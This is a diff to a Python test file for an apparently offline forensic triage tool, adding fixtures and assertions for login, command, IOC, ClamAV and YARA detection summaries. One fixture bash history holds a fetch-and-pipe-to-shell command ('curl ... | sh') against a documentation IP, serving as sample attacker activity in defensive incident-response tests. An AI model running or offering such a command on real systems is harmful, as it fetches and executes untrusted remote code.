@@ -24,7 +24,10 @@ def case(tmp_path):
                                               "/var/log/wtmp,USER_PROCESS,bob,pts/0,,10.0.0.5,1,2026-10-01T00:00:00Z\n"
                                               "/var/log/btmp,LOGIN_PROCESS,root,ssh:notty,,198.51.100.77,2,2026-10-01T00:00:01Z\n")
     (cooked / "gandalf+bash_history.csv").write_text("Command\nls\ncurl http://198.51.100.23/b | sh\n")
-    (host / "analysis" / "iocs.csv").write_text("Filename,ioc,indicator_type\nx,198.51.100.23,ipv4\nx,198.51.100.23,ipv4\ny,a.test,domain\n")
+    # As analysis/iocs.py writes them
+    (host / "analysis" / "iocs.csv").write_text(
+        "Filename,ioc,indicator_type,watchlist_match\nx,198.51.100.23,IPv4 address,YES\nx,198.51.100.23,IPv4 address,YES\n"
+        "y,a.test,domain,\nz,2001:db8::7,IPv6 address,\n")
     return str(tmp_path / "CASE01")
 
 
@@ -37,7 +40,8 @@ def test_case_answers(tmp_path):
     logins = eru_offline.answer("logins", path)
     assert "bob (1)" in logins and "198.51.100.77 (1)" in logins
     assert "curl http://198.51.100.23/b | sh" in eru_offline.answer("commands", path)
-    assert "198.51.100.23 (×2)" in eru_offline.answer("iocs", path)
+    found = eru_offline.answer("iocs", path)
+    assert "198.51.100.23 (×2, watchlist)" in found and "2001:db8::7 (×1)" in found and "a.test (×1)" in found
     assert "found nothing" in eru_offline.answer("analysis", path)
 
 
@@ -195,3 +199,16 @@ def test_unavailable_reasons():
                                               "http://h:11434", "llama3.2:3b")
     assert "isn't pulled" in no_model and "qwen2.5" in no_model
     assert eru_offline.unavailable_reason({"available": True, "model_loaded": True}, "h", "m") == ""
+
+
+def test_detections_include_clamav_and_yara(tmp_path):
+    path = case(tmp_path)
+    analysis = tmp_path / "CASE01" / "lab-ubuntu" / "analysis"
+    (analysis / "analysis.csv").write_text("LastWriteTime,hostname,Filename,analysis_type,analysis_value\n"
+                                           "t,h,/tmp/.x/miner,ClamAV,Multios.Coinminer.Miner-1\n"
+                                           "t,h,/x.exe,Timestomp,$SI: a|$FN: b\n")
+    (analysis / "yara.csv").write_text("yara_rule,yara_file,file,path,offset,signature_name,matched_data\n"
+                                       "Webshell,r.yar,s.php,/var/www,0x1,a,x\nWebshell,r.yar,s.php,/var/www,0x9,b,y\n")
+    found = eru_offline.answer("detections", path)
+    assert "ClamAV: Multios.Coinminer.Miner-1 /tmp/.x/miner" in found and "Timestomp" not in found
+    assert found.count("YARA Webshell: /var/www/s.php") == 1
